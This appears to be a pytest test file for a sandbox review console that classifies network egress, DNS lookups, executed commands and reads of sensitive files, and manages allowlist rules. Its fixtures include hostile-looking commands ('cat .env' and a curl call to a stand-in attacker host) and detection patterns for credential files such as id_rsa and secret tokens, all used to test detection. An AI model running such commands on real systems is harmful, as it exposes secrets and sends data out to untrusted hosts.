"""Sandbox review console: the deterministic classifier + rule store.

The classifier is pure (evidence dict + rule index -> session view), so it is
tested directly with fabricated captures. The nft side is guarded to no-op on a
host without sudo/nft, so rule CRUD is exercised against the DB only.
"""
import httpx
import pytest

from backend import sandbox
from backend.auth import hash_password
from backend.db import get_db, init_db
from backend.gate import (parse_dns_replies, parse_dns_typed,
                          parse_drops_counted, pcap_bytes)
from backend.main import app
from backend.memory import ensure_memory_seeds


# ---- classifier ------------------------------------------------------------

def _ev(**kw):
    base = {"flows": [], "blocked": [], "dns": [], "execs": [], "sensitive": [],
            "staged": []}
    base.update(kw)
    return base


def test_delivered_flow_is_learned_with_bytes():
    ev = _ev(flows=[{"ip": "151.101.0.223", "port": 443, "proto": "tcp",
                     "host": "pypi.org", "bytes_down": 1_300_000, "bytes_up": 4000}])
    c = sandbox.classify(ev, {})
    row = c["egress"][0]
    assert row["learned"] and row["status"] == "delivered" and row["sev"] == "ok"
    assert "MB" in row["bytes"] and row["scope"] == "wan"
    assert c["verdict"] == "ok"


def test_blocked_wan_has_attempts_no_bytes():
    ev = _ev(blocked=[{"ip": "44.203.18.9", "port": 443, "proto": "tcp",
                       "host": "telemetry-cdn.net", "attempts": 5}])
    c = sandbox.classify(ev, {})
    row = c["egress"][0]
    assert row["status"] == "blocked" and row["bytes"] is None
    assert row["attempts"] == 5 and row["sev"] == "warn" and not row["learned"]
    assert c["facts"]["egress_new"] == 1
    assert c["verdict"] == "warn"


def test_blocked_becomes_ok_when_allowlisted():
    ev = _ev(blocked=[{"ip": "1.2.3.4", "port": 443, "proto": "tcp",
                       "host": "api.example.com", "attempts": 2}])
    idx = {("1.2.3.4", 443, "tcp"): {"ip": "1.2.3.4", "port": 443,
                                     "proto": "tcp", "dest": "api.example.com"}}
    c = sandbox.classify(ev, idx)
    row = c["egress"][0]
    assert row["learned"] and row["sev"] == "ok" and row["status"] == "delivered"
    assert c["verdict"] == "ok"


def test_lan_scope_split():
    ev = _ev(blocked=[{"ip": "10.0.0.1", "port": 80, "proto": "tcp",
                       "host": None, "attempts": 1}])
    c = sandbox.classify(ev, {})
    assert c["egress"][0]["scope"] == "lan"
    assert c["egress"][0]["rule"] == "lan-not-allowlisted"
    assert c["facts"]["lan_hosts"] == 1


def test_sensitive_from_exec_argv_is_critical():
    ev = _ev(execs=["cat .env", "python3 app.py"])
    c = sandbox.classify(ev, {})
    assert any(s["path"] == ".env" for s in c["sensitive"])
    assert c["verdict"] == "crit" and c["rule"] == "sensitive-path-read"


def test_exec_reaching_untrusted_host_is_critical():
    ev = _ev(execs=["curl -s https://evil.example.com/x"])
    c = sandbox.classify(ev, {})
    flagged = [e for e in c["execs"] if e["sev"] == "crit"]
    assert flagged and "evil.example.com" in flagged[0]["rule"]
    assert c["verdict"] == "crit"


def test_staged_sensitive_is_flagged():
    ev = _ev(staged=["src/proprietary/pricing.py", "src/app.py"])
    c = sandbox.classify(ev, {})
    assert any("proprietary" in s["path"] for s in c["sensitive"])


def test_dns_new_flag_from_allowlist():
    ev = _ev(dns=[{"name": "pypi.org", "type": "A"},
                  {"name": "sketchy.net", "type": "A"}])
    idx = {("1.2.3.4", 443, "tcp"): {"dest": "pypi.org", "ip": "1.2.3.4",
                                     "port": 443, "proto": "tcp"}}
    c = sandbox.classify(ev, idx)
    by = {d["name"]: d["new"] for d in c["dns"]}
    assert by["pypi.org"] is False and by["sketchy.net"] is True


def test_is_lan():
    assert sandbox.is_lan("192.168.1.5") and sandbox.is_lan("10.0.0.1")
    assert not sandbox.is_lan("8.8.8.8")


def test_match_sensitive_globs():
    assert sandbox.match_sensitive(".env")
    assert sandbox.match_sensitive("finance/q3.xlsx")
    assert sandbox.match_sensitive("a/b/secrets/token")
    assert sandbox.match_sensitive("keys/id_rsa")
    assert sandbox.match_sensitive("src/app.py") is None


# ---- gate parsers ----------------------------------------------------------

def test_pcap_bytes_accounts_per_peer():
    text = (
        "IP 10.66.0.10.51000 > 151.101.0.223.443: tcp 517\n"
        "IP 151.101.0.223.443 > 10.66.0.10.51000: tcp 1448\n"
        "IP 151.101.0.223.443 > 10.66.0.10.51000: tcp 1000\n")
    flows = pcap_bytes(text)
    assert len(flows) == 1
    f = flows[0]
    assert f["ip"] == "151.101.0.223" and f["port"] == 443
    assert f["bytes_up"] == 517 and f["bytes_down"] == 2448


def test_parse_drops_counted_aggregates():
    text = (
        "kernel: jvm-egress-drop IN=jvtap0 SRC=10.66.0.10 DST=1.2.3.4 PROTO=TCP DPT=443\n"
        "kernel: jvm-egress-drop IN=jvtap0 SRC=10.66.0.10 DST=1.2.3.4 PROTO=TCP DPT=443\n"
        "kernel: jvm-host-drop IN=jvtap0 SRC=10.66.0.10 DST=10.66.0.1 PROTO=TCP DPT=22\n")
    got = {(d["ip"], d["port"]): d["attempts"] for d in parse_drops_counted(text)}
    assert got[("1.2.3.4", 443)] == 2 and got[("10.66.0.1", 22)] == 1


def test_build_evidence_delivered_needs_reply():
    """A tap-visible outbound SYN to a dropped host must NOT count as delivered;
    only a peer that sent data back is a real flow. Gateway DNS is infra."""
    from backend.gate import _build_evidence
    pcap = ("IP 10.66.0.10.5000 > 1.1.1.1.443: tcp 100\n"
            "IP 1.1.1.1.443 > 10.66.0.10.5000: tcp 5000\n"      # delivered
            "IP 10.66.0.10.5001 > 9.9.9.9.443: tcp 0\n"         # blocked SYN, no reply
            "IP 10.66.0.10.5002 > 10.66.0.1.53: tcp 40\n"
            "IP 10.66.0.1.53 > 10.66.0.10.5002: tcp 60\n")      # infra DNS reply
    drops = [{"ip": "9.9.9.9", "port": 443, "proto": "tcp", "attempts": 3}]
    ev = _build_evidence(1, "slug", "cmd", {"exit_status": 0, "staged": []},
                         True, True, "", [], since_drops=drops, pcap_text=pcap)
    flows = {(f["ip"], f["port"]) for f in ev["flows"]}
    blocked = {(b["ip"], b["port"]) for b in ev["blocked"]}
    assert ("1.1.1.1", 443) in flows
    assert ("9.9.9.9", 443) in blocked
    assert ("10.66.0.1", 53) not in flows      # infra filtered out


def test_parse_dns_replies_and_typed():
    text = ("query[A] pypi.org from 10.66.0.10\n"
            "reply pypi.org is 151.101.0.223\n")
    assert parse_dns_replies(text) == {"151.101.0.223": "pypi.org"}
    assert parse_dns_typed(text) == [{"name": "pypi.org", "type": "A"}]


# ---- rule store (nft guarded to no-op) -------------------------------------

@pytest.fixture
async def client(tmp_env):
    await init_db()
    ensure_memory_seeds()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("hunter2")))
        await db.commit()
    finally:
        await db.close()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
        await c.post("/api/auth/login", json={"username": "operator", "password": "hunter2"})
        yield c


async def test_rule_crud_roundtrip(tmp_env, monkeypatch):
    await init_db()
    calls = []
    monkeypatch.setattr(sandbox, "_nft_add",
                        lambda ip, port, proto: calls.append(("add", ip, port)))
    monkeypatch.setattr(sandbox, "_nft_del",
                        lambda ip, port, proto: calls.append(("del", ip, port)))
    # _nft_add/_nft_del are awaited; wrap the lambdas as coroutines
    async def _add(ip, port, proto): calls.append(("add", ip, port))
    async def _del(ip, port, proto): calls.append(("del", ip, port))
    monkeypatch.setattr(sandbox, "_nft_add", _add)
    monkeypatch.setattr(sandbox, "_nft_del", _del)

    r = await sandbox.add_rule("pypi.org", "151.101.0.223", 443, note="pip")
    assert r["dest"] == "pypi.org" and ("add", "151.101.0.223", 443) in calls
    rules = await sandbox.list_rules()
    assert len(rules) == 1
    idx = await sandbox.rules_index()
    assert ("151.101.0.223", 443, "tcp") in idx
    assert await sandbox.delete_rule(r["id"]) is True
    assert await sandbox.list_rules() == []
    assert not await sandbox.delete_rule(999)


async def test_sandbox_api_empty(client):
    assert (await client.get("/api/sandbox/sessions")).json() == {"sessions": []}
    assert (await client.get("/api/sandbox/rules")).json() == {"rules": []}
    r = await client.get("/api/sandbox/sessions/999")
    assert r.status_code == 404
    r = await client.delete("/api/sandbox/rules/999")
    assert r.status_code == 404
